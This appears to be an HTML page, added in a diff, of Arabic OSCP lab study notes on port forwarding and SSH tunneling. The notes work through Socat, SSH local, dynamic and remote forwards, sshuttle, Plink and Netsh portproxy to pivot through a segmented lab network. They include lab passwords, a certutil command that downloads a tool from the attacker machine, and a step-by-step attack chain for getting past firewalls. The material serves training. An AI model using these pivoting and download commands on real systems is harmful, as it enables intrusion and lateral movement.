+<div class="cmp-card amber">
+  <div class="cmp-title">استخدم Socat</div>
+  <ul>
+    <li>SSH غير متاح أو لا توجد بيانات اعتماد</li>
+    <li>تحتاج تمرير سريع وبسيط مع بروتوكولات غير عادية أو UDP</li>
+    <li>بيئات مقيَّدة جدًا حيث التعقيد غير مطلوب</li>
+  </ul>
+</div>
+</div>
+
+<hr />
+
+<h2 id="lu4"><span class="num">04</span><span class="htext">SSH Local · Dynamic · Remote · Remote Dynamic</span></h2>
+
+<h3>SSH Local Port Forwarding (-L)</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ الفكرة</div>
+<p>تفتح بورتًا على <strong>جهازك</strong> يتصل بشفافية بخدمة داخلية. كل الترافيك يسير مشفَّرًا عبر اتصال SSH لجهاز الـ pivot، الذي يتصل بالوجهة النهائية نيابةً عنك.</p>
+<p><strong>اتجاه الترافيك:</strong> جهازك → SSH Pivot → الهدف الداخلي | <strong>ميزة أساسية:</strong> لا بورتات جديدة تُفتَح على الـ pivot</p>
+</div>
+
+<div class="callout case">
+<div class="callout-label">✎ السيناريو</div>
+<p>PGDATABASE01 يمكنها الوصول لشبكة أعمق (172.16.50.0/24). SMB server على 172.16.50.217 — غير قابل للوصول من Kali. الهدف: الوصول لـ SMB share مباشرةً من Kali عبر النفق.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — من CONFLUENCE01</span><pre><code>ssh -N -L 0.0.0.0:4455:172.16.50.217:445 \
+  database_admin@10.4.50.215
+
+# -N          = لا shell تفاعلي (فقط النفق)
+# 0.0.0.0     = استمع على كل الواجهات
+# 4455        = البورت المحلي على CONFLUENCE01
+# 172.16.50.217:445 = الوجهة النهائية
+</code></pre></div>
+
+<div class="flow-vis">
+  <div class="flow-row"><span class="fn attacker">Kali: smbclient -p 4455</span><span class="fa">→</span><span class="fn pivot">C01:4455</span><span class="fa">→ [SSH tunnel] →</span><span class="fn pivot">PG01</span><span class="fa">→</span><span class="fn target">172.16.50.217:445</span></div>
+  <div class="flow-row"><span class="fl" style="color:var(--green)">3 hops — تصفّح SMB server داخلي من Kali!</span></div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — من Kali</span><pre><code>smbclient -p 4455 -L //192.168.50.63/ \
+  -U hr_admin --password=Welcome1234
+</code></pre></div>
+
+<h3>SSH Dynamic Port Forwarding (-D)</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ قيد -L والحل</div>
+<p>كل <code>-L</code> forward يتصل بـ <strong>وجهة واحدة</strong> فقط — أمر واحد لكل خدمة. الـ Dynamic forwarding يحلّ هذا: ينشئ <strong>SOCKS proxy</strong> على جهازك — نفق واحد لـ <strong>أي وجهة</strong>. التطبيقات بتبعث الترافيك للبورت الـ SOCKS؛ SSH يوجّهه لأي مضيف داخلي. الوجهة تُحدَّد ديناميكيًا داخل كل طلب.</p>
+</div>
+
+<div class="callout definition">
+<div class="callout-label">⬦ SOCKS وProxychains</div>
+<p><strong>SOCKS:</strong> بروتوكول proxy يُعيد توجيه الحزم لوجهتها. SOCKS4 = TCP فقط | SOCKS5 = TCP + UDP + توثيق | <strong>Proxychains:</strong> يُجبر التطبيقات التي لا تدعم SOCKS أصلًا على التوجيه عبر proxy. يعترض استدعاءات الشبكة في runtime. أضف <code>proxychains</code> قبل أي أمر لتنفيذه عبر النفق.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — من CONFLUENCE01</span><pre><code>ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+</code></pre></div>
+
+<div class="code-wrap"><span class="code-tag">bash — Proxychains config + الاستخدام من Kali</span><pre><code># تعديل /etc/proxychains4.conf
+# أضف:
+socks5 192.168.50.63 9999
+
+# فحص عبر الـ proxy
+proxychains nmap -sT -Pn 172.16.50.217
+
+# تصفح SMB
+proxychains smbclient -L //172.16.50.217/ -U hr_admin
+
+# تحميل ملف
+proxychains smbclient //172.16.50.217/scripts -U hr_admin
+smb: \> get Provisioning.ps1
+</code></pre></div>
+
+<div class="callout note">
+<div class="callout-label">ⓘ ملاحظة</div>
+<p>Proxychains بيضيف latency — الفحوصات الكبيرة ستكون أبطأ. استخدم <code>-sT</code> (TCP connect scan) مع nmap بدل <code>-sS</code> (SYN scan) لأن Proxychains لا يدعم raw packets.</p>
+</div>
+
+<h3>SSH Remote Port Forwarding (-R)</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ المشكلة التي يحلّها</div>
+<p>الـ firewalls الصارمة تحجب كل الاتصالات <strong>من الخارج للـ pivot</strong>. لكن الاتصالات <strong>الصادرة من الـ pivot</strong> مسموحة (شائع في الشبكات المؤسسية). الـ Remote forwarding يستغل هذا التفاوت: الجهاز المخترَق <strong>يبدأ</strong> اتصال SSH خارجيًا لجهازك. بورت استماع يُنشَأ على <strong>جهازك</strong>. الترافيك المُرسَل لذلك البورت يُوجَّه عبر النفق للشبكة الداخلية.</p>
+</div>
+
+<div class="callout case">
+<div class="callout-label">✎ السيناريو</div>
+<p>الـ Firewall يسمح فقط بـ TCP 8090 وارد لـ CONFLUENCE01. لا يمكن فتح بورتات جديدة للاتصالات الواردة من Kali. SSH الصادر من CONFLUENCE01 لـ Kali مسموح.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — من CONFLUENCE01 (خارجي لـ Kali)</span><pre><code># ابدأ SSH server على Kali أولًا
+sudo systemctl start ssh
+
+# من CONFLUENCE01 — اتصال خارجي لـ Kali
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 \
+  kali@192.168.118.4
+
+# -R = remote forward
+# 127.0.0.1:2345 = البورت المفتوح على KALI
+# 10.4.50.215:5432 = الوجهة النهائية
+</code></pre></div>
+
+<div class="flow-vis">
+  <div class="flow-row"><span class="fn attacker">Kali: psql -h 127.0.0.1 -p 2345</span><span class="fa">→</span><span class="fn attacker">Kali:2345 (SSH server)</span><span class="fa">→ [reverse SSH] →</span><span class="fn pivot">C01</span><span class="fa">→</span><span class="fn target">PG01:5432</span></div>
+  <div class="flow-row"><span class="fl" style="color:var(--green)">✓ Firewall تجاوز — لا قاعدة inbound مطلوبة!</span></div>
+</div>
+
+<h3>SSH Remote Dynamic Port Forwarding (-R SOCKS)</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ الدمج بين -R و-D</div>
+<p>يجمع بين <code>-R</code> (نفق عكسي) و<code>-D</code> (SOCKS proxy). الـ <code>-R</code> العادي: اتصال واحد، وجهة واحدة — محدود للاستطلاع. الـ Remote Dynamic: SOCKS proxy على <strong>جهازك</strong>، التمرير يتم بواسطة الـ pivot. نفس مرونة <code>-D</code>، لكن يعمل خلال firewalls صارمة للاتصالات الواردة.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># ابدأ SSH server على Kali
+sudo systemctl start ssh
+
+# من CONFLUENCE01 — Remote Dynamic
+ssh -N -R 9998 kali@192.168.118.4
+# -R مع بورت فقط = remote dynamic
+# SOCKS proxy يُفتَح على Kali:9998
+
+# أضف لـ /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+
+# فحص عبر النفق من Kali
+proxychains nmap -sT -Pn 10.4.50.64
+# يكتشف: 80، 3306، 3389...
+</code></pre></div>
+
+<h3>سلسلة الهجوم الحقيقية باستخدام الأنواع الثلاثة</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الخطوة</th><th>التقنية</th><th>الهدف</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>اختراق CONFLUENCE01</td><td>الحصول على shell في المنطقة الوسطى (DMZ)</td></tr>
+<tr><td>2</td><td><code>-L</code> Local</td><td>وصول مباشر لقاعدة البيانات الداخلية لسرقة credentials</td></tr>
+<tr><td>3</td><td>كسر الهاشات</td><td>الحصول على باسوردات صالحة للتنقّل الجانبي</td></tr>
+<tr><td>4</td><td><code>-D</code> Dynamic</td><td>فحص الشبكة الداخلية كاملًا — إيجاد أهداف جديدة</td></tr>
+<tr><td>5</td><td><code>-R</code> Remote</td><td>الحفاظ على وصول مستمر رغم الـ firewalls الصارمة</td></tr>
+</tbody>
+</table></div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu4_takeaways.txt</div>
+<ul>
+<li><code>-L</code>: دقيق ومحدَّد — لما تعرف بالضبط الخدمة التي تحتاجها</li>
+<li><code>-D</code>: استطلاع واسع — خريطة الشبكة ← إيجاد أهداف جديدة</li>
+<li><code>-R</code>: استمرارية رغم الـ firewalls — يستغل الاتصالات الصادرة المسموحة</li>
+<li><code>-R</code> بدون وجهة = Remote Dynamic = <code>-D</code> عكسي — مرونة كاملة</li>
+<li>دايمًا ابدأ SSH server على Kali قبل <code>-R</code>: <code>sudo systemctl start ssh</code></li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu5"><span class="num">05</span><span class="htext">sshuttle — Tunneling شبيه بالـ VPN</span></h2>
+
+<h3>ما هو sshuttle</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Definition</div>
+<p><strong>sshuttle</strong> بيحوّل اتصال SSH لنفق شبيه بالـ VPN. بدلًا من تمرير بورت واحد في كل مرة، يوجّه شبكات كاملة بشفافية. لا حاجة لإعداد SOCKS proxy أو Proxychains. التطبيقات تعمل عادي — لا تعرف إن الترافيك يُنفَّق.</p>
+</div>
+
+<p><strong>المتطلبات:</strong> وصول SSH لمضيف pivot داخل الشبكة المستهدَفة | صلاحيات root على <strong>جهازك</strong> (يعدّل جداول التوجيه وiptables) | Python مثبَّت على المضيف البعيد | <strong>لا يحتاج</strong> تثبيت أي شيء على الـ pivot خلاف Python</p>
+
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># الخطوة 1: إنشاء Socat forward على C01 لجعل SSH لـ PG01 قابلًا للوصول
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+# الخطوة 2: تشغيل sshuttle من Kali
+sshuttle -r database_admin@192.168.50.63:2222 \
+  10.4.50.0/24 172.16.50.0/24
+
+# بعد هذا — لا إعداد per-port مطلوب!
+smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+# لا proxychains، لا config إضافي!
+</code></pre></div>
+
+<h3>sshuttle مقابل Proxychains + SSH -D</h3>
+<div class="compare-grid">
+<div class="cmp-card green">
+  <div class="cmp-title">sshuttle</div>
+  <ul>
+    <li>توجيه شفاف شبيه بالـ VPN</li>
+    <li>لا حاجة لإعداد proxy على مستوى التطبيق</li>
+    <li>كل الترافيك للـ subnet يُوجَّه تلقائيًا</li>
+    <li>يعمل مع أدوات لا تدعم SOCKS</li>
+    <li>يحتاج root على جهازك</li>
+    <li>يحتاج Python على الـ remote host</li>
+    <li>أكثر وضوحًا في logs الـ firewall</li>
+  </ul>
+</div>
+<div class="cmp-card blue">
+  <div class="cmp-title">Proxychains + SSH -D</div>
+  <ul>
+    <li>توجيه proxy على مستوى التطبيق</li>
+    <li>يجب إضافة proxychains قبل كل أمر</li>
+    <li>التطبيق يجب أن يدعم SOCKS أو يستخدم proxychains</li>
+    <li>أكثر خفاءً — أقل بصمة</li>
+    <li>لا يحتاج root على جهازك</li>
+    <li>لا أدوات إضافية على الـ remote host</li>
+    <li>أكثر مرونة للوصول المحدَّد</li>
+  </ul>
+</div>
+</div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu5_takeaways.txt</div>
+<ul>
+<li>sshuttle = الحل الأسهل لما تريد الوصول لـ subnet كامل بدون proxychains</li>
+<li>مثالي لمرحلة الاستطلاع حيث تريد تجربة أدوات متعددة على عناوين داخلية مختلفة</li>
+<li>يحتاج root على Kali — لأنه بيعدّل iptables وجداول التوجيه</li>
+<li>ممكن تدمجه مع Socat: sshuttle -r user@C01:2222 لتوجيه SSH عبر C01 لـ PG01</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu6"><span class="num">06</span><span class="htext">Port Forwarding بأدوات Windows</span></h2>
+<h3>Windows لديه OpenSSH مدمَج (منذ 2018)</h3>
+<p>Windows 10 April 2018 Update (v1803) يتضمّن OpenSSH client افتراضيًا. متاح في: <code>C:\Windows\System32\OpenSSH\</code> — تشمل <code>ssh.exe</code>، <code>scp.exe</code>، <code>sftp.exe</code>. لا تثبيت مطلوب — تقنية "living off the land".</p>
+
+<h3>Windows OpenSSH — Remote Dynamic Pivot</h3>
+<div class="callout case">
+<div class="callout-label">✎ السيناريو</div>
+<p>حصلنا على وصول RDP لـ MULTISERVER03 (Windows). الـ Firewall يسمح فقط بـ RDP وارد — كل اتصال وارد آخر محجوب. الاتصالات الصادرة مسموحة.</p>
+<p><strong>الاستراتيجية:</strong> استخدام <code>ssh.exe</code> من Windows لإنشاء نفق dynamic عكسي لـ Kali. SOCKS proxy يُفتَح على Kali — وجّه كل الأدوات عبره.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">windows cmd</span><pre><code># التحقق من OpenSSH
+where ssh
+ssh -V
+
+# ابدأ SSH server على Kali أولًا
+# sudo systemctl start ssh
+
+# من Windows CMD — Remote Dynamic
+ssh -N -R 9998 kali@192.168.118.4
+</code></pre></div>
+
+<div class="code-wrap"><span class="code-tag">kali bash</span><pre><code># أضف لـ /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+
+# الوصول لموارد داخلية عبر النفق
+proxychains psql -h 10.4.50.215 -U postgres
+</code></pre></div>
+
+<h3>Plink — SSH Tunneling بدون OpenSSH</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ ما هو Plink</div>
+<p>واجهة command-line لـ PuTTY — واحد من أكثر SSH clients استخدامًا على Windows تاريخيًا. يوجَد في بيئات أزيل منها OpenSSH لأسباب سياسية. أقل احتمالًا لتشغيل AV — مرتبط بأدوات إدارة شرعية.</p>
+<p><strong>يدعم:</strong> Local وRemote port forwarding ✓ | <strong>لا يدعم:</strong> Remote Dynamic port forwarding ✗</p>
+</div>
+
+<div class="callout case">
+<div class="callout-label">✎ السيناريو</div>
+<p>MULTISERVER03 — بورت 80 فقط مكشوف خارجيًا. اختُرق عبر web shell → reverse shell بـ Netcat. OpenSSH أُزيل — فقط Plink متاح. الهدف: تنفيذ RDP (بورت 3389) للخارج عبر SSH.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">windows cmd</span><pre><code"># تحميل Plink للجهاز المستهدَف
+cd C:\Windows\Temp
+certutil -urlcache -split -f http://KALI/plink.exe plink.exe
+
+# إنشاء Remote Port Forward
+# 'echo y' لتجاوز interactive host-key prompt في shell غير تفاعلي
+cmd.exe /c echo y | plink.exe -ssh \
+  -l kali -pw kalipassword \
+  -R 127.0.0.1:9833:127.0.0.1:3389 \
+  192.168.118.4
+</code></pre></div>
+
+<div class="code-wrap"><span class="code-tag">kali bash</span><pre><code"># الاتصال عبر البورت المُعاد توجيهه
+xfreerdp /u:rdp_admin /p:P@ssw0rd /v:127.0.0.1:9833
+# RDP session عبر الـ firewall!
+</code></pre></div>
+
+<h3>Netsh Portproxy — Port Forwarding أصيل من Windows</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ ما هو Netsh Portproxy</div>
+<p>Netsh (Network Shell) مدمَج في كل إصدارات Windows. يستخدم ميزة portproxy لإنشاء قواعد port forwarding مستمرة. <strong>لا أدوات من جهات خارجية مطلوبة.</strong> يتطلّب: صلاحيات Administrator + قاعدة firewall منفصلة للسماح بالترافيك. يدعم TCP فقط (لا UDP). ميزة: مستمر ويبقى بعد إعادة التشغيل.</p>
+</div>
+
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">الدخول لـ MULTISERVER03 عبر RDP</div><div class="step-body"><p>فتح Command Prompt كـ Administrator</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">إنشاء قاعدة portproxy</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">cmd — admin</span><pre><code>netsh interface portproxy add v4tov4 \
+  listenport=2222 \
+  listenaddress=192.168.50.64 \
+  connectport=22 \
+  connectaddress=10.4.50.215</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">التحقق من إنشاء القاعدة</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">cmd</span><pre><code">netsh interface portproxy show all
+netstat -anp TCP | find "2222"</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">إضافة قاعدة Windows Firewall</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">cmd — admin</span><pre><code">netsh advfirewall firewall add rule \
+  name="pf_ssh" protocol=TCP \
+  dir=in localport=2222 action=allow</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">الاتصال من Kali</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code">ssh database_admin@192.168.50.64 -p 2222
+# → يصل لـ PGDATABASE01:22 عبر MULTISERVER03!</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">6</div><div class="step-title">التنظيف بعد انتهاء المهمة</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">cmd — admin</span><pre><code">netsh advfirewall firewall delete rule name="pf_ssh"
+netsh interface portproxy del v4tov4 \
+  listenport=2222 listenaddress=192.168.50.64</code></pre></div>
+<p><strong>مهم:</strong> دايمًا نظّف port forwards وقواعد الـ firewall بعد المهمة لتجنّب ترك backdoors دائمة.</p>
+</div></div>
+</div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu6_takeaways.txt</div>
+<ul>
+<li>Windows OpenSSH (v1803+) = نفس قدرات SSH Linux من CMD — <code>-L/-D/-R</code> كلها تعمل</li>
+<li>Plink = بديل قانوني للبيئات بدون OpenSSH — لا يدعم Remote Dynamic</li>
+<li>Netsh Portproxy = أداة أصيلة مستمرة — تحتاج Admin + قاعدة Firewall منفصلة + TCP فقط</li>
+<li>دايمًا نظّف الـ portproxy rules والـ firewall rules بعد المهمة</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+<h4>مقارنة الأدوات السريعة</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>المنصة</th><th>التشفير</th><th>يحتاج Root</th><th>أنواع البروتوكول</th></tr></thead>
+<tbody>
+<tr><td>Socat</td><td>Linux</td><td>لا (بالافتراضي)</td><td>لا (للبورتات >1024)</td><td>TCP، UDP</td></tr>
+<tr><td>SSH -L/-D</td><td>Linux/Windows</td><td>نعم</td><td>لا</td><td>TCP</td></tr>
+<tr><td>SSH -R</td><td>Linux/Windows</td><td>نعم</td><td>لا</td><td>TCP</td></tr>
+<tr><td>sshuttle</td><td>Linux</td><td>نعم</td><td>نعم (client)</td><td>TCP</td></tr>
+<tr><td>Netsh Portproxy</td><td>Windows</td><td>لا</td><td>نعم (Admin)</td><td>TCP فقط</td></tr>
+<tr><td>Plink</td><td>Windows</td><td>نعم</td><td>لا</td><td>TCP</td></tr>
+</tbody>
+</table></div>
+
+<h4>SSH Tunneling — مرجع الأوامر</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الأمر</th><th>ملاحظة</th></tr></thead>
+<tbody>
+<tr><td>Local (-L)</td><td><code>ssh -N -L [bind:]LPORT:DEST:DPORT user@PIVOT</code></td><td><code>0.0.0.0</code> للاستماع على كل الواجهات</td></tr>
+<tr><td>Dynamic (-D)</td><td><code>ssh -N -D [bind:]PORT user@PIVOT</code></td><td>أضف <code>socks5 PIVOT PORT</code> لـ proxychains.conf</td></tr>
+<tr><td>Remote (-R)</td><td><code>ssh -N -R [bind:]PORT:DEST:DPORT user@KALI</code></td><td>ابدأ SSH server على Kali أولًا</td></tr>
+<tr><td>Remote Dynamic</td><td><code>ssh -N -R PORT user@KALI</code></td><td>SOCKS proxy يُفتَح على Kali:PORT</td></tr>
+</tbody>
+</table></div>
+
+<h4>Socat والأدوات الأخرى</h4>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code"># Socat Port Forward الأساسي
+socat -ddd TCP-LISTEN:LPORT,fork TCP:DEST_IP:DEST_PORT
+
+# sshuttle — توجيه subnet كامل
+sshuttle -r user@PIVOT:PORT SUBNET1 SUBNET2
+
+# Netsh Portproxy (Windows — Admin)
+netsh interface portproxy add v4tov4 \
+  listenport=LPORT listenaddress=LOCAL_IP \
+  connectport=DPORT connectaddress=DEST_IP
+
+# Plink — Remote Port Forward (Windows)
+cmd.exe /c echo y | plink.exe -ssh -l USER -pw PASS \
+  -R 127.0.0.1:LPORT:127.0.0.1:DPORT KALI_IP
+
+# Proxychains
+proxychains nmap -sT -Pn TARGET
+proxychains smbclient -L //TARGET/ -U USER
+</code></pre></div>
+
+<h4>متى تختار ماذا — دليل سريع</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الموقف</th><th>الأداة الأنسب</th></tr></thead>
+<tbody>
+<tr><td>Pivot بدون SSH credentials، TCP فقط</td><td>Socat</td></tr>
+<tr><td>وصول لخدمة داخلية محددة، SSH متاح</td><td>SSH -L</td></tr>
+<tr><td>فحص شبكة داخلية كاملة عبر pivot</td><td>SSH -D + Proxychains</td></tr>
+<tr><td>Firewall صارم للواردات، outbound مسموح</td><td>SSH -R أو Remote Dynamic</td></tr>
+<tr><td>الوصول لـ subnet كامل بدون proxychains</td><td>sshuttle</td></tr>
+<tr><td>Windows pivot، RDP فقط مكشوف</td><td>OpenSSH -R أو Plink -R</td></tr>
+<tr><td>Windows pivot، بدون tools رفع</td><td>Netsh Portproxy + Firewall Rule</td></tr>
+</tbody>
+</table></div>
+</div>
+
+<hr />
+
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الشبكات المقسَّمة والـ firewalls تمنع الوصول المباشر — Port Forwarding والـ Tunneling أساسيَّان للتنقّل فيها. كل تقنية بتحلّ سيناريو مختلف، ودمجها معًا بيعطيك تحكّمًا كاملًا في الشبكة المقسَّمة من الخارج.</p>
+
+<div class="diagram-card">
+<svg viewBox="0 0 760 200" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <marker id="afinal" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#E8A23A"/></marker>
+    <marker id="afinalr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#E1362F"/></marker>
+  </defs>
+  <g font-family="IBM Plex Mono, monospace" font-size="10.5" fill="#C4C4CA">
+    <!-- Zones -->
+    <text x="80" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">WAN</text>
+    <text x="300" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">DMZ</text>
+    <text x="530" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">Internal</text>
+    <text x="680" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">Deep Internal</text>
+    <line x1="180" y1="10" x2="180" y2="195" stroke="#2A2A2F" stroke-dasharray="4,3"/>
+    <line x1="420" y1="10" x2="420" y2="195" stroke="#2A2A2F" stroke-dasharray="4,3"/>
+    <line x1="600" y1="10" x2="600" y2="195" stroke="#2A2A2F" stroke-dasharray="4,3"/>
+    <!-- Kali -->
+    <rect x="10" y="80" width="110" height="45" rx="6" fill="#17171A" stroke="#E1362F" stroke-width="1.5"/>
+    <text x="65" y="100" text-anchor="middle" fill="#E1362F" font-weight="700">Kali</text>
+    <text x="65" y="116" text-anchor="middle" font-size="9.5">192.168.x.x</text>
+    <!-- C01 -->
+    <rect x="200" y="80" width="140" height="45" rx="6" fill="#17171A" stroke="#4EA1D3" stroke-width="1.5"/>
+    <text x="270" y="100" text-anchor="middle" fill="#4EA1D3" font-weight="700">CONFLUENCE01</text>
+    <text x="270" y="116" text-anchor="middle" font-size="9.5">WAN+DMZ pivot</text>
+    <!-- PG01 -->
+    <rect x="435" y="80" width="130" height="45" rx="6" fill="#17171A" stroke="#3FBF6E" stroke-width="1.5"/>
+    <text x="500" y="100" text-anchor="middle" fill="#3FBF6E" font-weight="700">PGDATABASE01</text>
+    <text x="500" y="116" text-anchor="middle" font-size="9.5">10.4.50.215</text>
+    <!-- SMB -->
+    <rect x="615" y="80" width="130" height="45" rx="6" fill="#17171A" stroke="#A179E8" stroke-width="1.5"/>
+    <text x="680" y="100" text-anchor="middle" fill="#A179E8" font-weight="700">SMB / RDP</text>
+    <text x="680" y="116" text-anchor="middle" font-size="9.5">172.16.50.x</text>
+    <!-- Arrows with labels -->
+    <path d="M120 92 H200" stroke="#E8A23A" stroke-width="1.8" marker-end="url(#afinal)"/>
+    <text x="160" y="87" text-anchor="middle" fill="#E8A23A" font-size="9">Socat/-L/-D</text>
+    <path d="M340 102 H435" stroke="#E8A23A" stroke-width="1.8" marker-end="url(#afinal)"/>
+    <text x="387" y="97" text-anchor="middle" fill="#E8A23A" font-size="9">SSH -L/-D</text>
+    <path d="M565 102 H615" stroke="#E8A23A" stroke-width="1.8" marker-end="url(#afinal)"/>
+    <text x="590" y="97" text-anchor="middle" fill="#E8A23A" font-size="9">-L</text>
+    <!-- Reverse arrow for -R -->
+    <path d="M200 112 H120" stroke="#E1362F" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#afinalr)"/>
+    <text x="160" y="130" text-anchor="middle" fill="#E1362F" font-size="9">SSH -R (outbound)</text>
+    <!-- Labels at bottom -->
+    <text x="270" y="155" text-anchor="middle" fill="#muted" font-size="10" fill="#8A8A92">Socat / sshuttle</text>
+    <text x="500" y="155" text-anchor="middle" font-size="10" fill="#8A8A92">SSH credentials reuse</text>
+    <text x="680" y="155" text-anchor="middle" font-size="10" fill="#8A8A92">3-hop access via -L</text>
+  </g>
+</svg>
+<div class="diagram-caption">خريطة الهجوم الكاملة — كل التقنيات المغطّاة في الموديول مدمجة معًا</div>
+</div>
+
+<blockquote>
+<p><strong>القاعدة الذهبية:</strong> دايمًا نظّف الـ port forwards وقواعد الـ firewall وأي أدوات رفعتها بعد انتهاء المهمة. تركها خلفك يعني ترك backdoors دائمة قد يستغلّها مهاجم آخر أو تسبّب مشاكل لبيئة العميل.</p>
+</blockquote>
+<hr />
+<p><em>نهاية نوتس الموديول السادس عشر — OSCP: Port Redirection & SSH Tunneling</em></p>
+  <div class="footer-note">-- EOF: module-16/port-redirection-ssh-tunneling.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement;
+  var btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement;var s=h.scrollTop;var ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');if(s>500){t.classList.add('show');}else{t.classList.remove('show');}}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var codeEl=wrap.querySelector('code');if(!codeEl)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){var text=codeEl.innerText;if(navigator.clipboard){navigator.clipboard.writeText(text).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
